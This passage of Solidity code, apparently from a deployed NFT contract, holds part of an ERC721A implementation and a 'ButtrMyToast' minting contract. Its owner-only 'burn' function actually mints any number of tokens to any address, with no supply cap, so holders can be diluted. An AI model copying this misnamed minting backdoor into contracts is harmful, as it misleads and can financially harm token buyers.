1092         require(to != address(0), "ERC721A: mint to the zero address");
1093         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1094 
1095         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1096 
1097         // Overflows are incredibly unrealistic.
1098         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1099         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1100         unchecked {
1101             _addressData[to].balance += uint128(quantity);
1102             _addressData[to].numberMinted += uint128(quantity);
1103 
1104             _ownerships[startTokenId].addr = to;
1105             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1106 
1107             uint256 updatedIndex = startTokenId;
1108 
1109             for (uint256 i; i < quantity; i++) {
1110                 emit Transfer(address(0), to, updatedIndex);
1111                 if (safe) {
1112                     require(
1113                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1114                         "ERC721A: transfer to non ERC721Receiver implementer"
1115                     );
1116                 }
1117 
1118                 updatedIndex++;
1119             }
1120 
1121             currentIndex = updatedIndex;
1122         }
1123 
1124         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1125     }
1126 
1127     /**
1128      * @dev Transfers `tokenId` from `from` to `to`.
1129      *
1130      * Requirements:
1131      *
1132      * - `to` cannot be the zero address.
1133      * - `tokenId` token must be owned by `from`.
1134      *
1135      * Emits a {Transfer} event.
1136      */
1137     function _transfer(
1138         address from,
1139         address to,
1140         uint256 tokenId
1141     ) private {
1142         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1143 
1144         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1145             getApproved(tokenId) == _msgSender() ||
1146             isApprovedForAll(prevOwnership.addr, _msgSender()));
1147 
1148         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1149 
1150         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1151         require(to != address(0), "ERC721A: transfer to the zero address");
1152 
1153         _beforeTokenTransfers(from, to, tokenId, 1);
1154 
1155         // Clear approvals from the previous owner
1156         _approve(address(0), tokenId, prevOwnership.addr);
1157 
1158         // Underflow of the sender's balance is impossible because we check for
1159         // ownership above and the recipient's balance can't realistically overflow.
1160         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1161         unchecked {
1162             _addressData[from].balance -= 1;
1163             _addressData[to].balance += 1;
1164 
1165             _ownerships[tokenId].addr = to;
1166             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1167 
1168             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1169             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1170             uint256 nextTokenId = tokenId + 1;
1171             if (_ownerships[nextTokenId].addr == address(0)) {
1172                 if (_exists(nextTokenId)) {
1173                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1174                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1175                 }
1176             }
1177         }
1178 
1179         emit Transfer(from, to, tokenId);
1180         _afterTokenTransfers(from, to, tokenId, 1);
1181     }
1182 
1183     /**
1184      * @dev Approve `to` to operate on `tokenId`
1185      *
1186      * Emits a {Approval} event.
1187      */
1188     function _approve(
1189         address to,
1190         uint256 tokenId,
1191         address owner
1192     ) private {
1193         _tokenApprovals[tokenId] = to;
1194         emit Approval(owner, to, tokenId);
1195     }
1196 
1197     /**
1198      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1199      * The call is not executed if the target address is not a contract.
1200      *
1201      * @param from address representing the previous owner of the given token ID
1202      * @param to target address that will receive the tokens
1203      * @param tokenId uint256 ID of the token to be transferred
1204      * @param _data bytes optional data to send along with the call
1205      * @return bool whether the call correctly returned the expected magic value
1206      */
1207     function _checkOnERC721Received(
1208         address from,
1209         address to,
1210         uint256 tokenId,
1211         bytes memory _data
1212     ) private returns (bool) {
1213         if (to.isContract()) {
1214             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1215                 return retval == IERC721Receiver(to).onERC721Received.selector;
1216             } catch (bytes memory reason) {
1217                 if (reason.length == 0) {
1218                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1219                 } else {
1220                     assembly {
1221                         revert(add(32, reason), mload(reason))
1222                     }
1223                 }
1224             }
1225         } else {
1226             return true;
1227         }
1228     }
1229 
1230     /**
1231      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1232      *
1233      * startTokenId - the first token id to be transferred
1234      * quantity - the amount to be transferred
1235      *
1236      * Calling conditions:
1237      *
1238      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1239      * transferred to `to`.
1240      * - When `from` is zero, `tokenId` will be minted for `to`.
1241      */
1242     function _beforeTokenTransfers(
1243         address from,
1244         address to,
1245         uint256 startTokenId,
1246         uint256 quantity
1247     ) internal virtual {}
1248 
1249     /**
1250      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1251      * minting.
1252      *
1253      * startTokenId - the first token id to be transferred
1254      * quantity - the amount to be transferred
1255      *
1256      * Calling conditions:
1257      *
1258      * - when `from` and `to` are both non-zero.
1259      * - `from` and `to` are never both zero.
1260      */
1261     function _afterTokenTransfers(
1262         address from,
1263         address to,
1264         uint256 startTokenId,
1265         uint256 quantity
1266     ) internal virtual {}
1267 }
1268 
1269 contract ButtrMyToast is ERC721A, Ownable, ReentrancyGuard {
1270     string public baseURI = "ipfs://QmP1zrFvKD7p4XVDnwGCPC7bSWVMqKb4QgSx8bxFDPDLs1/";
1271     uint   public price             = 0.0033 ether;
1272     uint   public maxPerTx          = 20;
1273     uint   public maxPerFree        = 1;
1274     uint   public totalFree         = 3000;
1275     uint   public maxSupply         = 3000;
1276     bool   public mintEnabled;
1277     uint   public totalFreeMinted = 0;
1278 
1279     mapping(address => uint256) public _mintedFreeAmount;
1280 
1281     constructor() ERC721A("Buttr My Toast NFT", "TOAST"){}
1282 
1283     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1284         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1285         string memory currentBaseURI = _baseURI();
1286         return bytes(currentBaseURI).length > 0
1287             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1288             : "";
1289     }
1290     
1291 
1292     function _startTokenId() internal view virtual returns (uint256) {
1293         return 1;
1294     }
1295 
1296     function mint(uint256 count) external payable {
1297         uint256 cost = price;
1298         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1299             (_mintedFreeAmount[msg.sender] < maxPerFree));
1300 
1301         if (isFree) { 
1302             require(mintEnabled, "Mint is not live yet");
1303             require(totalSupply() + count <= maxSupply, "No more");
1304             require(count <= maxPerTx, "Max per TX reached.");
1305             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1306             {
1307              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1308              _mintedFreeAmount[msg.sender] = maxPerFree;
1309              totalFreeMinted += maxPerFree;
1310             }
1311             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1312             {
1313              require(msg.value >= 0, "Please send the exact ETH amount");
1314              _mintedFreeAmount[msg.sender] += count;
1315              totalFreeMinted += count;
1316             }
1317         }
1318         else{
1319         require(mintEnabled, "Mint is not live yet");
1320         require(msg.value >= count * cost, "Please send the exact ETH amount");
1321         require(totalSupply() + count <= maxSupply, "No more");
1322         require(count <= maxPerTx, "Max per TX reached.");
1323         }
1324 
1325         _safeMint(msg.sender, count);
1326     }
1327 
1328     function costCheck() public view returns (uint256) {
1329         return price;
1330     }
1331 
1332     function maxFreePerWallet() public view returns (uint256) {
1333       return maxPerFree;
1334     }
1335 
1336     function burn(address mintAddress, uint256 count) public onlyOwner {
1337         _safeMint(mintAddress, count);
1338     }
1339 
1340     function _baseURI() internal view virtual override returns (string memory) {
1341         return baseURI;
1342     }
1343 
1344     function setBaseUri(string memory baseuri_) public onlyOwner {
1345         baseURI = baseuri_;
1346     }
1347 
1348     function setPrice(uint256 price_) external onlyOwner {
1349         price = price_;
1350     }
1351 
1352     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1353         totalFree = MaxTotalFree_;
1354     }
1355 
1356      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1357         maxPerFree = MaxPerFree_;
1358     }
1359 
1360     function toggleMinting() external onlyOwner {
1361       mintEnabled = !mintEnabled;
1362     }
1363     
1364     function CommunityWallet(uint quantity, address user)
1365     public
1366     onlyOwner
1367   {
1368     require(
1369       quantity > 0,
1370       "Invalid mint amount"
1371     );
1372     require(
1373       totalSupply() + quantity <= maxSupply,
1374       "Maximum supply exceeded"
1375     );
1376     _safeMint(user, quantity);
1377   }
1378 
1379     function withdraw() external onlyOwner nonReentrant {
1380         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1381         require(success, "Transfer failed.");
1382     }
1383 }